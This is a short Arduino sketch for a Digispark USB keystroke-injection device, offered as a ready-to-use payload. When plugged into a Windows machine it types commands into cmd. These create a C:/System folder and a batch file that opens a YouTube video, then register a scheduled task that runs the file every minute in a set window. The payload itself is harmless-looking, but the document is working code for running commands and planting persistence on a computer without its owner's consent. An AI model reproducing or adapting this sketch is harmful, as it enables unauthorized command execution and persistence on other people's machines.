Runs a program every minute from XX:XX to XX:XX.

(Runs Once)

  #include "DigiKeyboard.h"

  void setup() {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(300);
    DigiKeyboard.println("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.println("cd / & mkdir System & cd system & echo start chrome https://www.youtube.com/watch?v=gR9-7SBZW9I > a.bat");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(100);
    DigiKeyboard.println("schtasks /Create /SC MINUTE /TN test /TR C:/system/a.bat /ST 13:00 /ET 13:05 /K & exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
  }
void loop() {
}